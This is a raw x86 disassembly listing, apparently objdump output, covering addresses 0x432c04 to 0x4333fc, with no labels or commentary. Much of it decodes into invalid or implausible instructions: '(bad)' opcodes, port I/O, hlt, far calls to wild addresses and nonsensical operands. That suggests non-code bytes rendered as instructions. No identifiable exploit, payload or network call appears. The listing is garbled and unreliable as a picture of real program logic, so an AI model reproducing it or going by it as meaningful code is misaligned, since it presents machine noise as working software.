  432c04:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  432c0a:	pop    ebp
  432c0b:	mov    DWORD PTR [esi-0x48],esi
  432c0e:	jmp    0x432c57
  432c10:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  432c16:	(bad)  
  432c18:	cmp    al,0x0
  432c1a:	cmp    eax,DWORD PTR [ebp+0x18]
  432c1d:	lea    ebx,[ebp-0x56]
  432c20:	jle    0x432c22
  432c22:	jae    0x432bad
  432c24:	mov    eax,esp
  432c26:	call   0xb900:0x8b005587
  432c2d:	inc    ebp
  432c2e:	push   ebp
  432c2f:	lea    ecx,[ebp-0x27ff4f12]
  432c35:	mov    eax,edi
  432c37:	int3   
  432c38:	push   ebp
  432c39:	xchg   edi,eax
  432c3b:	add    esp,ebp
  432c3d:	add    BYTE PTR [eax],al
  432c3f:	inc    ebp
  432c40:	add    BYTE PTR [ebp+0x8b3255],cl
  432c46:	cld    
  432c47:	mov    DWORD PTR [edx],edi
  432c49:	aam    0x75
  432c4b:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  432c51:	mov    DWORD PTR [ebx-0x50],edx
  432c54:	test   BYTE PTR [ebp-0x1],0xe8
  432c58:	mov    eax,DWORD PTR [eax]
  432c5a:	hlt    
  432c5b:	add    al,al
  432c5d:	mov    eax,DWORD PTR ds:0x890045a8
  432c63:	dec    DWORD PTR [ebx+0x45fdf0e8]
  432c69:	inc    DWORD PTR [eax*2+0xf75854d]
  432c70:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  432c76:	call   0x729989b7
  432c7b:	je     0x432cdb
  432c7d:	js     0x432cde
  432c7f:	lock ret 0x7e
  432c83:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  432c89:	mov    edi,edi
  432c8b:	sbb    al,bl
  432c8d:	clc    
  432c8e:	add    BYTE PTR [ebp-0x73],bh
  432c91:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  432c97:	ror    BYTE PTR [eax],1
  432c99:	dec    ebp
  432c9a:	xchg   ebp,eax
  432c9b:	mov    edi,edi
  432c9d:	in     al,0x8b
  432c9f:	jge    0x432c2a
  432ca1:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  432ca7:	clc    
  432ca8:	pop    esi
  432ca9:	fist   DWORD PTR [ebp+0x5d398b5d]
  432caf:	clc    
  432cb0:	add    al,0x6e
  432cb2:	mov    eax,DWORD PTR [ebx]
  432cb4:	mov    BYTE PTR [ebp+0x0],dl
  432cb7:	mov    edx,DWORD PTR [ebx-0x20]
  432cba:	adc    esi,DWORD PTR [edi+0x5e005f3a]
  432cc0:	add    eax,0x3b3b73
  432cc5:	adc    al,0x89
  432cc7:	pop    eax
  432cc8:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  432ccc:	ret    0xf08
  432ccf:	cmp    al,0x2
  432cd1:	mov    DWORD PTR [edx],edi
  432cd3:	cld    
  432cd4:	add    BYTE PTR [ebp+0x66],dl
  432cd7:	add    eax,ebx
  432cd9:	add    esp,eax
  432cdb:	sub    eax,eax
  432cdd:	or     BYTE PTR [ecx-0x77f474bb],cl
  432ce3:	add    BYTE PTR [eax],al
  432ce5:	mov    DWORD PTR [ebx-0x24],ebx
  432ce8:	push   edi
  432ce9:	push   ebp
  432cea:	clc    
  432ceb:	add    DWORD PTR [esi+0x1b0100],0x45
  432cf2:	out    0xff,eax
  432cf4:	add    edx,DWORD PTR [eax]
  432cf6:	jmp    0x432ce0
  432cf8:	cmp    ch,0x45
  432cfb:	(bad)  
  432cfc:	jmp    0x40c8b54e
  432d01:	je     0x432c8d
  432d03:	mov    eax,DWORD PTR [eax-0x10c78304]
  432d09:	inc    ebp
  432d0a:	add    BYTE PTR [ebx-0x770375],al
  432d10:	add    ah,ch
  432d12:	add    edx,esp
  432d14:	pop    edi
  432d15:	pop    ebp
  432d16:	push   ebp
  432d17:	inc    ebx
  432d18:	in     al,dx
  432d19:	pop    ebp
  432d1a:	in     al,dx
  432d1b:	cmp    edx,DWORD PTR [edi-0x8]
  432d1e:	xor    eax,0x895b9c94
  432d23:	leave  
  432d24:	call   0x8998742d
  432d29:	in     al,dx
  432d2a:	in     al,0x45
  432d2c:	dec    ebp
  432d2d:	push   esi
  432d2e:	test   DWORD PTR [eax+0xfb010f],esi
  432d34:	add    BYTE PTR [eax+0xc018b],dh
  432d3a:	leave  
  432d3b:	inc    ebp
  432d3c:	test   al,ch
  432d3e:	add    dh,bh
  432d40:	add    bh,bh
  432d42:	dec    ebp
  432d43:	push   cs
  432d44:	mov    DWORD PTR [ecx],eax
  432d46:	hlt    
  432d47:	push   es
  432d48:	dec    ebp
  432d49:	leave  
  432d4a:	mov    DWORD PTR [eax],ecx
  432d4c:	clc    
  432d4d:	cmovge eax,ecx
  432d50:	mov    ecx,0x85c2f0
  432d56:	clc    
  432d57:	pop    DWORD PTR [ebp+0x1]
  432d5a:	push   ebx
  432d5b:	add    BYTE PTR [ebp-0x15],bh
  432d5e:	push   esi
  432d5f:	xor    eax,0x898a45
  432d64:	cld    
  432d65:	add    BYTE PTR [ebp+0x0],al
  432d68:	cmp    esp,DWORD PTR [esi-0x64]
  432d6b:	add    DWORD PTR [esi+0x78308c1],edi
  432d71:	add    ah,BYTE PTR [esi-0x49]
  432d74:	int    0xbb
  432d76:	mov    ecx,DWORD PTR [edi+0xc]
  432d79:	add    dh,al
  432d7b:	cmp    ecx,ebx
  432d7d:	jne    0x432d47
  432d7f:	xor    ecx,DWORD PTR [ebp+0x66]
  432d82:	jmp    0xca2d88
  432d87:	add    DWORD PTR [ebp+0x0],eax
  432d8a:	mov    eax,ebx
  432d8c:	or     al,0x8b
  432d8e:	(bad)  
  432d8f:	mov    ecx,esi
  432d91:	mov    BYTE PTR [eax+eax*1+0x664c134],cl
  432d98:	mov    eax,edi
  432d9a:	or     BYTE PTR [edx],cl
  432d9c:	shl    cl,cl
  432d9e:	icebp  
  432d9f:	add    BYTE PTR [ebp+0x39],0x8b
  432da3:	or     BYTE PTR [edx+eax*2],cl
  432da6:	(bad)  
  432da7:	or     cl,dh
  432da9:	stc    
  432daa:	shl    DWORD PTR [ebp-0x30],0xc6
  432dae:	xor    al,0x0
  432db0:	inc    ebp
  432db1:	xchg   BYTE PTR [ebx],al
  432db3:	add    esp,edi
  432db5:	add    BYTE PTR [ebp-0x39],cl
  432db8:	mov    al,bl
  432dba:	test   DWORD PTR [ebx+0x1c348375],ecx
  432dc0:	sub    al,0xbf
  432dc2:	jmp    0x432d49
  432dc4:	mov    edi,eax
  432dc6:	lock jge 0x432dba
  432dc9:	lea    esi,[edx-0x74bad501]
  432dcf:	mov    ebp,esp
  432dd1:	or     cl,dh
  432dd3:	leave  
  432dd4:	add    al,BYTE PTR [eax+eax*4-0x37ff9a00]
  432ddb:	dec    ebp
  432ddc:	dec    ebp
  432ddd:	test   DWORD PTR [ebx],eax
  432ddf:	paddb  mm6,mm0
  432de2:	add    DWORD PTR [eax],eax
  432de4:	dec    ebp
  432de5:	mov    ecx,DWORD PTR [ebx-0x65b217f0]
  432deb:	mov    esi,DWORD PTR [edx]
  432ded:	or     al,0x2b
  432def:	dec    ebp
  432df0:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  432df6:	mov    esp,eax
  432df8:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  432dff:	mov    DWORD PTR [ebx],ebp
  432e01:	call   0xc76b731
  432e06:	mov    DWORD PTR [ebp+0x10],ecx
  432e09:	(bad)  
  432e0a:	push   0x8b85ff10
  432e0f:	clc    
  432e10:	or     al,0x53
  432e12:	(bad)  
  432e13:	push   ecx
  432e14:	retf   
  432e15:	mov    ebx,0xff4d8dc8
  432e1a:	mov    DWORD PTR [ebp+0x8],eax
  432e1d:	xor    eax,DWORD PTR [ebp-0x75]
  432e20:	cmp    ebp,DWORD PTR [ebx]
  432e22:	lsl    ebx,WORD PTR [edi-0x8]
  432e26:	call   DWORD PTR [ebx-0x741bff75]
  432e2c:	(bad)  
  432e2d:	or     al,0x5b
  432e2f:	dec    ebp
  432e30:	or     BYTE PTR [ebx],dh
  432e32:	inc    ebp
  432e33:	xor    esi,DWORD PTR ds:0x708088d
  432e39:	in     eax,0x9a
  432e3b:	add    BYTE PTR [edx],dh
  432e3d:	inc    ebp
  432e3e:	pop    edi
  432e3f:	xor    eax,edx
  432e41:	test   DWORD PTR [eax],0x81108b8b
  432e47:	dec    ebp
  432e48:	sub    al,0x33
  432e4a:	add    BYTE PTR [ebx],dh
  432e4c:	push   esi
  432e4d:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  432e53:	mov    edi,eax
  432e55:	or     BYTE PTR [ebp+0x45],al
  432e58:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  432e5e:	xor    eax,0xc7069cc9
  432e63:	inc    ebp
  432e64:	cld    
  432e65:	cmp    DWORD PTR [ebp+0x454df817],eax
  432e6b:	cmp    BYTE PTR ds:0xc7669c53,0xd1
  432e72:	in     al,0x4d
  432e74:	xchg   BYTE PTR [eax-0x3dbaac08],al
  432e7a:	aad    0xe9
  432e7c:	xlat   BYTE PTR ds:[ebx]
  432e7d:	rol    bh,cl
  432e7f:	mov    edx,esp
  432e81:	or     BYTE PTR [ebp+0x4588f84d],al
  432e87:	mov    ecx,DWORD PTR [eax]
  432e89:	or     BYTE PTR [eax],al
  432e8b:	push   ebp
  432e8c:	mov    edi,DWORD PTR [eax+0xfc728b]
  432e92:	dec    ebp
  432e93:	enter  0xceba,0x8
  432e97:	retf   0x1807
  432e9a:	ret    0x9a4d
  432e9d:	mov    esi,DWORD PTR [edx]
  432e9f:	or     al,0x33
  432ea1:	into   
  432ea2:	add    edx,esi
  432ea4:	add    ecx,edx
  432ea6:	bswap  eax
  432ea8:	ror    esi,0x98
  432eab:	dec    ebp
  432eac:	add    cl,ch
  432eae:	mov    edi,edi
  432eb0:	hlt    
  432eb1:	inc    esi
  432eb3:	inc    ebp
  432eb4:	ret    0x4533
  432eb7:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  432ebd:	or     BYTE PTR [ebx],dh
  432ebf:	dec    ebp
  432ec0:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  432ec6:	jne    0xff8d2e8d
  432ecc:	inc    ebp
  432ecd:	inc    ebp
  432ece:	mov    esi,DWORD PTR [ebx]
  432ed0:	clc    
  432ed1:	pop    esi
  432ed2:	ret    0xcaeb
  432ed5:	mov    eax,esi
  432ed7:	call   0x520482aa
  432edc:	dec    ebp
  432edd:	add    eax,0xf8728b
  432ee2:	adc    eax,0xce0ccac9
  432ee7:	push   ebp
  432ee8:	ret    0xc6ec
  432eeb:	in     al,dx
  432eec:	call   0x33437bf5
  432ef1:	push   edi
  432ef2:	add    edi,eax
  432ef4:	xor    eax,eax
  432ef6:	jmp    0x432f3d
  432ef8:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  432efe:	add    eax,edi
  432f00:	shr    eax,cl
  432f02:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  432f08:	mov    esi,DWORD PTR [esp+ebp*8]
  432f0b:	pushf  
  432f0c:	ret    0x84c7
  432f0f:	fcomp  DWORD PTR [edx-0x7607cd7b]
  432f15:	inc    ebp
  432f16:	in     al,dx
  432f17:	xor    eax,0xc78b9c45
  432f1c:	cld    
  432f1d:	fmul   st(2),st
  432f1f:	sbb    dl,al
  432f21:	jmp    0x9c3b:0x364d45c1
  432f28:	jbe    0x432ef1
  432f2a:	mov    esp,eax
  432f2c:	clc    
  432f2d:	add    BYTE PTR [ebp+0x0],cl
  432f30:	mov    ecx,ecx
  432f32:	lea    eax,[ebp-0x5]
  432f35:	mov    edi,edi
  432f37:	call   0x51ce8281
  432f3c:	hlt    
  432f3d:	xor    eax,edx
  432f3f:	mov    esi,0x9a7284
  432f44:	xor    cl,dl
  432f46:	mov    esi,eax
  432f48:	hlt    
  432f49:	into   
  432f4a:	inc    ebp
  432f4b:	scas   eax,DWORD PTR es:[edi]
  432f4c:	mov    ebp,ecx
  432f4e:	cld    
  432f4f:	add    dl,cl
  432f51:	add    dl,al
  432f53:	inc    ebp
  432f54:	shr    DWORD PTR [ebx],0x4d
  432f57:	xor    edi,DWORD PTR [ebx]
  432f59:	mov    DWORD PTR [edi],ecx
  432f5b:	clc    
  432f5c:	dec    esi
  432f5d:	inc    ebp
  432f5e:	dec    DWORD PTR [ebx-0x3d2b1775]
  432f64:	ret    0xc6ca
  432f67:	mov    BYTE PTR [ebp-0x32],0x53
  432f6b:	scas   eax,DWORD PTR es:[edi]
  432f6c:	inc    ebp
  432f6d:	jmp    0x432fa5
  432f6f:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  432f76:	pop    ebx
  432f77:	xor    ecx,DWORD PTR [ebp+0x3]
  432f7a:	mov    eax,DWORD PTR [ebx]
  432f7c:	clc    
  432f7d:	test   edx,ecx
  432f7f:	mov    ecx,esi
  432f81:	cld    
  432f82:	call   0x8ab774cc
  432f87:	xor    ecx,DWORD PTR [eax+0x4533f303]
  432f8d:	add    ecx,DWORD PTR [ebx-0x4974072d]
  432f93:	fdiv   QWORD PTR [ebx]
  432f95:	retf   0xce89
  432f98:	in     al,0xc1
  432f9a:	inc    ebp
  432f9b:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  432fa1:	into   
  432fa2:	mov    dh,0xc1
  432fa5:	call   0x8c17752e
  432faa:	(bad)  
  432fab:	cld    
  432fac:	mov    ecx,DWORD PTR [ebp-0x14]
  432faf:	xor    eax,ecx
  432fb1:	lea    eax,[ebp+0x8]
  432fb4:	mov    esi,DWORD PTR [edx-0x4]
  432fb7:	add    dl,al
  432fb9:	inc    ebp
  432fba:	mov    esp,0x32d89a8b
  432fbf:	dec    ebp
  432fc0:	mov    esi,DWORD PTR [ebx]
  432fc2:	cld    
  432fc3:	xor    eax,edx
  432fc5:	sub    esp,DWORD PTR [esi-0x75]
  432fc8:	int    0xec
  432fca:	sub    ecx,eax
  432fcc:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  432fd2:	mov    esi,esp
  432fd4:	call   0x34177d5d
  432fd9:	inc    DWORD PTR [ebx]
  432fdb:	mov    edi,DWORD PTR [ebx]
  432fdd:	cld    
  432fde:	jne    0x43302d
  432fe0:	mov    esi,DWORD PTR [ebx]
  432fe2:	aam    0x8d
  432fe4:	dec    ebp
  432fe5:	or     BYTE PTR [ebx],dh
  432fe7:	jb     0x432fec
  432fe9:	add    BYTE PTR [edi+0x45],bl
  432fec:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  432ff3:	xor    ebp,esp
  432ff5:	xor    eax,edi
  432ff7:	sub    edi,esp
  432ff9:	mov    eax,DWORD PTR [ebp+0x34c8f8f4]
  432fff:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  433006:	inc    ebp
  433007:	xor    ecx,DWORD PTR [ecx+0x45891403]
  43300d:	clc    
  43300e:	mov    eax,edi
  433010:	nop
  433011:	fadd   QWORD PTR [eax]
  433013:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  433019:	jmp    0x432fa4
  43301b:	mov    eax,DWORD PTR [ecx]
  43301d:	fadd   DWORD PTR [eax]
  43301f:	inc    ebp
  433020:	or     DWORD PTR [ebx],esi
  433022:	dec    eax
  433023:	add    edx,DWORD PTR [ebx-0x2d]
  433026:	dec    ebp
  433027:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  43302d:	inc    ebp
  43302e:	push   ebx
  43302f:	mov    dl,BYTE PTR [ecx-0xd]
  433032:	xor    ecx,DWORD PTR [ebp-0x45]
  433035:	(bad)  
  433037:	rol    BYTE PTR [eax],0xc1
  43303a:	ret    
  43303b:	inc    ebp
  43303c:	inc    ebp
  43303d:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  433043:	xor    eax,ebx
  433045:	add    eax,DWORD PTR [ebp+0x23]
  433048:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  43304e:	cmp    edi,0xc
  433051:	dec    ebp
  433052:	inc    ebp
  433053:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  433059:	inc    ebp
  43305a:	mov    esi,DWORD PTR [ebx]
  43305c:	clc    
  43305d:	lea    eax,[ebp+0x45725407]
  433063:	add    BYTE PTR [ebp+eax*2-0x75],dh
  433067:	xor    edi,DWORD PTR [eax]
  433069:	mov    ecx,0xff8b8d4d
  43306e:	push   esp
  43306f:	enter  0x4df7,0x23
  433073:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  433079:	mov    eax,DWORD PTR [ebx]
  43307b:	loopne 0x433068
  43307d:	ret    0xc68b
  433080:	push   esp
  433081:	enter  0x9745,0x8b
  433085:	inc    ebp
  433086:	cld    
  433087:	mov    eax,edi
  433089:	clc    
  43308a:	ret    
  43308b:	ret    0xc645
  43308e:	mov    esi,DWORD PTR [ebx]
  433090:	cld    
  433091:	pop    esi
  433092:	mov    ebx,0x83458bc3
  433098:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  43309c:	dec    ebp
  43309d:	xor    eax,0xba039c33
  4330a2:	mov    DWORD PTR [ebp+0x55d8f889],eax
  4330a8:	inc    ebp
  4330a9:	mov    edi,DWORD PTR [ebx]
  4330ab:	adc    al,0x9c
  4330ad:	inc    ebp
  4330ae:	(bad)  
  4330af:	mov    ebx,eax
  4330b1:	adc    al,0x85
  4330b3:	cmp    al,0x1
  4330b6:	inc    ebp
  4330b7:	add    BYTE PTR [ecx],bh
  4330b9:	dec    ebp
  4330ba:	pushf  
  4330bb:	mov    ebp,ecx
  4330bd:	mov    eax,DWORD PTR [ebx]
  4330bf:	nop
  4330c0:	add    BYTE PTR [eax],al
  4330c2:	inc    ebp
  4330c3:	mov    esi,DWORD PTR [ebx]
  4330c5:	add    eax,DWORD PTR [ebx]
  4330c7:	cmp    al,0x89
  4330c9:	mov    esp,esi
  4330cb:	clc    
  4330cc:	inc    ebp
  4330cd:	inc    ebp
  4330ce:	add    edx,DWORD PTR [esi+0xc]
  4330d1:	mov    edi,0x7ff0845
  4330d6:	in     al,dx
  4330d7:	(bad)  
  4330d8:	jne    0x433074
  4330da:	mov    esi,DWORD PTR [edx]
  4330dc:	clc    
  4330dd:	add    ebp,DWORD PTR [esi]
  4330df:	mov    edi,edi
  4330e1:	in     al,dx
  4330e2:	mov    DWORD PTR [ebp-0x10],eax
  4330e5:	xor    eax,DWORD PTR [ebp+0x3]
  4330e8:	cmp    eax,0x8bf49c89
  4330ed:	inc    ebp
  4330ee:	fmul   DWORD PTR [ebx-0x173caf39]
  4330f4:	lea    ecx,[ecx+0x45e8d4bc]
  4330fa:	clc    
  4330fb:	mov    edi,edi
  4330fd:	cmp    BYTE PTR [ebp+0x4d],al
  433100:	test   DWORD PTR [eax+0x74],ecx
  433103:	inc    ecx
  433104:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  43310a:	ret    
  43310b:	inc    eax
  43310c:	dec    DWORD PTR [ebx+0x4945f8f0]
  433112:	push   eax
  433113:	dec    eax
  433114:	test   al,0xd0
  433116:	dec    eax
  433118:	mov    eax,DWORD PTR [ebp-0x14]
  43311b:	mov    eax,DWORD PTR [ebp+0x38]
  43311e:	mov    eax,ecx
  433120:	fadd   DWORD PTR [ebx]
  433122:	dec    ebp
  433123:	inc    eax
  433124:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  43312a:	inc    ebp
  43312b:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  433131:	fadd   QWORD PTR [ebx]
  433133:	inc    ebp
  433134:	or     al,0x33
  433136:	dec    ebp
  433137:	add    edi,DWORD PTR [ebx]
  433139:	mov    DWORD PTR [edx-0x28],esi
  43313c:	mov    eax,DWORD PTR [ebp-0x10]
  43313f:	mov    eax,DWORD PTR [eax+0x10]
  433142:	mov    eax,edi
  433144:	lock ret 
  433146:	inc    ecx
  433147:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  43314d:	fsubr  st,st(5)
  43314f:	test   DWORD PTR [eax],eax
  433151:	clc    
  433152:	push   0x45
  433154:	(bad)  
  433155:	cmp    ch,ah
  433157:	pushf  
  433158:	inc    ebp
  433159:	(bad)  
  43315a:	push   eax
  43315b:	fsub   DWORD PTR [eax-0x7b]
  43315e:	(bad)  
  43315f:	clc    
  433160:	mov    eax,0xf8008584
  433165:	mov    eax,DWORD PTR [ebp-0x4]
  433168:	mov    edi,0x4585c3cc
  43316e:	clc    
  43316f:	mov    eax,DWORD PTR [ebp+0x14]
  433172:	cmp    eax,DWORD PTR [ebp-0x64]
  433175:	mov    edi,eax
  433177:	in     al,dx
  433178:	les    esi,FWORD PTR [ebp-0x7b]
  43317b:	mov    edi,eax
  43317d:	or     al,0x4d
  43317f:	dec    ebp
  433180:	mov    eax,ebp
  433182:	in     al,0xf2
  433184:	dec    ebp
  433185:	dec    DWORD PTR [ecx+0x4dc7e045]
  43318b:	fmul   DWORD PTR [ecx+0x4df8f085]
  433191:	inc    ebp
  433192:	mov    DWORD PTR [ebx],esi
  433194:	fadd   QWORD PTR [ebx]
  433196:	dec    ebp
  433197:	push   eax
  433198:	xor    eax,DWORD PTR [ebp+0x3]
  43319b:	push   eax
  43319c:	mov    DWORD PTR [eax+ebx*8],ebx
  43319f:	push   esi
  4331a1:	mov    eax,DWORD PTR [eax]
  4331a3:	lock cmp eax,0xf84e85c0
  4331a9:	inc    ebp
  4331aa:	test   BYTE PTR [ebx],dh
  4331ac:	add    DWORD PTR [ebx],eax
  4331ae:	add    BYTE PTR [eax+0x4d],dl
  4331b1:	jne    0x4331e6
  4331b3:	lea    ecx,[ebx-0x7617fc44]
  4331b9:	div    ah
  4331bb:	inc    DWORD PTR [ebp+0x45]
  4331be:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  4331c4:	jb     0x433151
  4331c6:	add    BYTE PTR [eax*2-0x17ba743f],cl
  4331cd:	mov    ecx,DWORD PTR [ebp-0x10]
  4331d0:	xor    ecx,DWORD PTR [ebp+0x3]
  4331d3:	mov    edi,DWORD PTR [ebx]
  4331d5:	adc    BYTE PTR [ebp+0x41],dh
  4331d8:	mov    ecx,DWORD PTR [ebx-0x37382704]
  4331de:	ret    
  4331df:	push   ss
  4331e0:	push   0x45
  4331e2:	lea    ecx,[ebx+0x4de80cb0]
  4331e8:	sti    
  4331e9:	add    edi,edi
  4331eb:	or     BYTE PTR [ebp+0x4d],al
  4331ee:	mov    ebp,DWORD PTR [ebx]
  4331f0:	xor    ebp,ecx
  4331f2:	mov    al,BYTE PTR [edx]
  4331f4:	add    eax,0xc7200
  4331f9:	jne    0x433248
  4331fb:	lea    esi,[ebx]
  4331fd:	mov    al,0xf
  4331ff:	call   0xf28c4
  433204:	shl    DWORD PTR ds:0x89019c84,0x0
  43320b:	rol    BYTE PTR [ebp+0x45],1
  43320e:	mov    esi,DWORD PTR [ebx+esi*1]
  433211:	pushf  
  433212:	mov    al,bh
  433214:	add    eax,0x8572c8
  433219:	clc    
  43321a:	dec    ebp
  43321b:	inc    ebp
  43321c:	xor    edi,DWORD PTR [edx]
  43321e:	setl   al
  433221:	(bad)  
  433222:	retf   
  433223:	rol    cl,1
  433225:	dec    ebp
  433226:	test   BYTE PTR [ebp+0x4d00cc01],cl
  43322c:	inc    ebp
  43322d:	lea    ecx,[ebx-0x75b2cc38]
  433233:	lea    eax,ds:0x4d72c4
  433239:	mov    ecx,DWORD PTR [ebp-0x4]
  43323c:	xor    ecx,edi
  43323e:	bswap  ebx
  433240:	ror    BYTE PTR [ebp-0x35],0xe9
  433244:	rol    DWORD PTR [ecx],0x84
  433247:	add    BYTE PTR [ecx],al
  433249:	cmp    eax,DWORD PTR [eax]
  43324b:	pushf  
  43324c:	inc    ebp
  43324d:	jnp    0x8a436650
  433253:	mov    eax,DWORD PTR ds:0xcf72e8
  433259:	lock dec ebp
  43325b:	retf   
  43325c:	xor    ecx,DWORD PTR [ebp+0xf]
  43325f:	mov    eax,eax
  433261:	fmul   st,st(3)
  433263:	test   ecx,0x19a8484
  433269:	xor    al,BYTE PTR [eax]
  43326b:	mov    DWORD PTR [ebp-0x28],eax
  43326e:	mov    eax,DWORD PTR [ebp+0x33]
  433271:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  433277:	ret    
  433278:	add    al,cl
  43327a:	dec    ebp
  43327b:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  433281:	add    ecx,DWORD PTR ds:0xc7250
  433287:	inc    ebp
  433288:	rcl    DWORD PTR [eax+0x4d],0x2b
  43328c:	mov    edi,edi
  43328e:	xor    ecx,DWORD PTR [ebx+0xde48a]
  433294:	jb     0x43325d
  433296:	add    BYTE PTR [ecx+eax*8-0x74cdb2b6],al
  43329d:	mov    esi,DWORD PTR [ebx]
  43329f:	cld    
  4332a0:	mov    cl,bh
  4332a2:	or     eax,0x372b6
  4332a7:	cmp    ecx,eax
  4332a9:	jne    0x433326
  4332af:	mov    eax,DWORD PTR [ebp-0x20]
  4332b2:	mov    eax,DWORD PTR [eax]
  4332b4:	xor    eax,edi
  4332b6:	mov    al,BYTE PTR [ebp+eax*1+0x32724a]
  4332bd:	mov    ecx,DWORD PTR [ebp-0x4]
  4332c0:	mov    ecx,edi
  4332c2:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4332c8:	jb     0x4332d9
  4332ca:	add    BYTE PTR [edi-0x3f],dl
  4332cd:	add    BYTE PTR [ebp-0x75],cl
  4332d0:	mov    esi,eax
  4332d2:	xor    eax,DWORD PTR [eax]
  4332d4:	mov    al,bh
  4332d6:	or     eax,0x4a7284
  4332db:	xor    al,cl
  4332dd:	mov    ecx,DWORD PTR [ebp-0x4]
  4332e0:	mov    ecx,edi
  4332e2:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4332e8:	jb     0x4332f9
  4332ea:	add    BYTE PTR [edi],dh
  4332ec:	enter  0x8500,0x8b
  4332f0:	add    ah,bl
  4332f2:	add    BYTE PTR [eax],al
  4332f4:	inc    ebp
  4332f5:	(bad)  
  4332f6:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a4a]
  4332fd:	mov    esi,DWORD PTR [edx-0x4]
  433300:	add    bh,cl
  433302:	dec    ebp
  433303:	mov    dh,0x8b
  433305:	add    esi,DWORD PTR [ebx]
  433307:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  43330d:	add    BYTE PTR [eax],al
  43330f:	mov    eax,ecx
  433311:	loopne 0x433360
  433313:	add    BYTE PTR [ebx-0x757bcc39],cl
  433319:	dec    edx
  43331a:	or     eax,0x8b7232
  43331f:	in     al,0xc1
  433321:	or     DWORD PTR [ebp-0x31],ecx
  433324:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4a]
  43332b:	xor    dh,BYTE PTR [edx-0x75]
  43332e:	add    al,dh
  433330:	enter  0x4f09,0xcf
  433334:	inc    ebp
  433335:	mov    WORD PTR [ebx-0x75cdccb6],cs
  43333b:	or     al,BYTE PTR ds:0xe4728b
  433341:	or     DWORD PTR [ebp-0x31],ecx
  433344:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4e]
  43334b:	cmp    dh,BYTE PTR [edx+0xf]
  43334e:	add    bl,dl
  433350:	rol    DWORD PTR [eax],0x4d
  433353:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  433359:	(bad)  
  43335a:	or     eax,0x4a7284
  43335f:	xor    al,cl
  433361:	mov    ecx,DWORD PTR [ebp-0x20]
  433364:	mov    ecx,DWORD PTR [ecx]
  433366:	xor    ecx,edi
  433368:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724a]
  43336f:	xor    cl,al
  433371:	mov    ecx,DWORD PTR [edi]
  433373:	fadd   QWORD PTR [ebp+0x9]
  433376:	call   0xffd02e4a
  43337b:	dec    edx
  43337c:	dec    ebp
  43337d:	xor    bh,BYTE PTR [ebx]
  43337f:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  433383:	loopne 0x433381
  433385:	or     edi,eax
  433387:	iret   
  433388:	ret    
  433389:	mov    WORD PTR [ebp+0x4e],es
  43338c:	mov    esi,DWORD PTR [edx]
  43338e:	call   0x8452facd
  433393:	(bad)  
  433394:	call   0x8bdc:0x338b3200
  43339b:	add    ah,bh
  43339d:	(bad)  
  43339e:	push   ebp
  43339f:	test   BYTE PTR [ebx],dh
  4333a1:	dec    edx
  4333a2:	add    esi,DWORD PTR [edx]
  4333a4:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  4333aa:	dec    edi
  4333ac:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d4a]
  4333b3:	xor    al,BYTE PTR [ebx]
  4333b5:	mov    edi,DWORD PTR [ebx]
  4333b7:	in     al,0x75
  4333b9:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  4333bf:	dec    edx
  4333c0:	xor    esi,DWORD PTR [edx]
  4333c2:	lea    ecx,[edx]
  4333c4:	or     BYTE PTR [ebx+0x900f072],cl
  4333ca:	ja     0x43339b
  4333cc:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b2],cl
  4333d3:	cmp    ch,al
  4333d5:	jne    0x4333ca
  4333d7:	mov    edi,edi
  4333d9:	fadd   QWORD PTR [ebp+0x0]
  4333dc:	mov    eax,edi
  4333de:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb6]
  4333e5:	mov    edx,DWORD PTR [ebx]
  4333e7:	in     al,0x45
  4333e9:	or     DWORD PTR [ebx],esi
  4333eb:	iret   
  4333ec:	add    ecx,DWORD PTR [eax+edx*2+0x4532184a]
  4333f3:	xor    dl,BYTE PTR [eax-0x75]
  4333f6:	sbb    al,0xe0
  4333f8:	dec    DWORD PTR [ecx]
  4333fa:	mov    ecx,edi
  4333fc:	in     al,dx
